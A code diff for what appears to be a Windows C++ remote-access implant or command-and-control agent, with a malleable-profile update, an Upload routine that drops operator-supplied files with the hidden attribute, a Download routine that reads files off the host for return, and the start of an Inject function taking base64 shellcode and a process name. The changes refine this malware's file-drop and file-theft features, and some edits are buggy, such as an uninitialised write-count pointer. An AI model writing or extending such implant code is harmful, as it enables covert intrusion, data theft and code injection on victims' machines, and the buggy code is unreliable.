@@ -223,22 +223,23 @@ void UpdateProfile(rapidjson::Value* changes, MalleableProfile* currentProfile) 
 }
 
 std::string Upload(std::string fileName, std::string b64Contents) {
-    CHAR path [200];
-    CHAR fullPath [200];
-
     std::vector<BYTE> bytes = base64Decode(b64Contents);
-    GetTempPathA(80, path);
-    PathCombineA(fullPath, path, fileName.c_str());
-    HANDLE hFile = CreateFileA(fullPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
+
+    HANDLE hFile = CreateFileA(fileName.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        return "ERROR";
+        return "ERROR: INVALID HANDLE";
     }
 
-    PSIZE_T out_size;
+    LPDWORD out_size;
 
-    if (WriteFile(hFile, &bytes.at(0), sizeof(BYTE) * bytes.size(), NULL, NULL) == 0) {
-        return "ERROR";
+    // Write file bytes
+    if(!WriteFile(hFile, bytes.data(), bytes.size(), out_size, NULL))
+    {
+        return "ERROR: WRITE FAILED";
     }
+
+    CloseHandle(hFile);
+
     return fileName;
 }
 
@@ -246,34 +247,34 @@ std::string Download(std::string filepath) {
     DWORD file_attr = GetFileAttributesA(filepath.c_str());
 
     if (file_attr == INVALID_FILE_ATTRIBUTES) {
-        return "ERROR";
+        return "ERROR: INVALID FILE ATTRIBUTES";
     }
     if (file_attr & FILE_ATTRIBUTE_DIRECTORY) {
-        return "DIR";
+        return "ERROR: IS DIRECTORY";
     }
-    HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+    HANDLE hFile = CreateFileA(filepath.c_str(), GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        return "ERROR";
+        return "ERROR: INVALID HANDLE";
     }
 
     LARGE_INTEGER size;
     DWORD lower = GetFileSizeEx(hFile, &size);
     if (size.QuadPart >= 1000000000) {
-        return "TOO BIG";
+        return "ERROR: TOO BIG";
     }
     BYTE* raw_buffer = (BYTE*)malloc(size.QuadPart);
     if (raw_buffer == NULL) {
-        return "ERROR";
+        return "ERROR: CANNOT ALLOCATE";
     }
     memset(raw_buffer, 0, size.QuadPart);
     DWORD bytes_read;
     if (ReadFile(hFile, raw_buffer, size.QuadPart, &bytes_read, NULL) == 0) {
-        return "ERROR";
+        return "ERROR: CANNOT READ";
     }
     std::vector<BYTE> vec;
     vec.reserve(bytes_read);
     vec.assign(raw_buffer, raw_buffer + bytes_read);
-    return base64Encode(vec);
+    return std::string(vec.begin(), vec.end());
 }
 
 std::string Inject(std::string b64shellcode, std::string processName) {
